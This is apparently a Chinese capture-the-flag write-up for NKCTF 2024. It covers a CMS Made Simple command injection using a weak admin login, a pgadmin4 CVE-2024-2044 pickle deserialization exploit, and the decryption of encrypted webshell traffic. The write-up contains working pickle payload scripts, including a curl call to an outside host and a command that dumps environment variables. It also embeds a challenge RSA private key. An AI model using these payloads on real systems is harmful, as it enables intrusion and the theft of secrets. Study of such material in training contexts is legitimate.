# 2024NKCTF


真遗憾今年没抽到贴纸

<!--more-->

## web

### [my first cms]

考点cve

cms made simple 2.2.19

[GitHub - capture0x/CMSMadeSimple](https://github.com/capture0x/CMSMadeSimple)

后台扫描发现登录页面`/admin/login.php`

弱口令`admin/Admin123`

命令执行：

```
<?php echo system('cat /_fffff1@g'); ?>
```

![image-20240325001938779](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim)

### [attack_tacooooo]

`tacooooo@qq.com/tacooooo`登录`pgadmin4`

右下角有提示

![image-20240325003958443](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim)

搜索`pgadmin4.8.3`的漏洞得到

- [CVE-2024-2044](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2044)

参考：

https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/

```python
import struct
import sys

def produce_pickle_bytes(platform, cmd):
    b = b'\x80\x04\x95'
    b += struct.pack('L', 22 + len(platform) + len(cmd))
    b += b'\x8c' + struct.pack('b', len(platform)) + platform.encode()
    b += b'\x94\x8c\x06system\x94\x93\x94'
    b += b'\x8c' + struct.pack('b', len(cmd)) + cmd.encode()
    b += b'\x94\x85\x94R\x94.'
    print(b)
    return b

if __name__ == '__main__':
    with open('posix.pickle', 'wb') as f:
        f.write(produce_pickle_bytes('posix', f"curl http://{HOST}/"))
```

根据流程改cookie值可以反弹shell随后在`crontab -e`得到flag

---

赛后看到另外一个师傅写的script：

流程跟上面的差不多，改完cookie在文件管理里面有1.txt得到flag

```python
import struct
import sys
import pickle
import base64
class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('cat /proc/1/environ > /var/lib/pgadmin/storage/tacooooo_qq.com/1.txt')",))
poc = A()
result = pickle.dumps(poc)
if __name__ == '__main__':
    with open('C:\\Users\\scofi\\Desktop\\posix.pickle', 'wb') as f:
        f.write(result)
```

[NKCTF2024-WEB-gxngxngxn - gxngxngxn - 博客园 (cnblogs.com)](https://www.cnblogs.com/gxngxngxn/p/18091636)

## misc

### [signin]

base解码公众号回复

### [Webshell_pro]

流量分析，请求流量是经过加密的，响应包流量可以通过base解码

在tcp流9得到请求体的加密代码

![image-20240325002220370](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim)

把加密逆向得到明文，以此对请求包的shell参数进行解密

```python
import base64

import libnum
from Crypto.PublicKey import RSA
pubkey = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB
-----END PUBLIC KEY-----
"""

prikey = """-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==
-----END PRIVATE KEY-----
"""

pubkey = RSA.import_key(pubkey)
prikey = RSA.import_key(prikey)
n = pubkey.n
def decrypt(cipher_text):
# 首先，将enc_replace函数中的编码反转
    cipher_text = cipher_text.replace("JXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2", "=")
    cipher_text = cipher_text.replace("n6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8W", "+")
    cipher_text = cipher_text.replace("e5Lg^FM5EQYe5!yF&62%V$UG*B*RfQeM", "/")

# 然后，解码base64字符串
    cipher_text = base64.b64decode(cipher_text)

# 使用公钥解密
    plain_text = b""
    for i in range(0, len(cipher_text), 128):
        part = cipher_text[i:i + 128]
        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))
        plain_text += dec
    return plain_text

if __name__ == '__main__':
    c = "G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2"
    decrypted_data = decrypt(c)
    print(f"解密后的数据: {decrypted_data}")
```

![image-20240325002817196](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim)

得到新的密文

```
U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==
```

![image-20240325002938538](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim)

经过两次对tcp流8的解码，得到

```
PASSWORD:
Password-based-encryption
```

aes解密得到flag

https://www.sojson.com/encrypt_aes.html

![image-20240325003106849](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim)


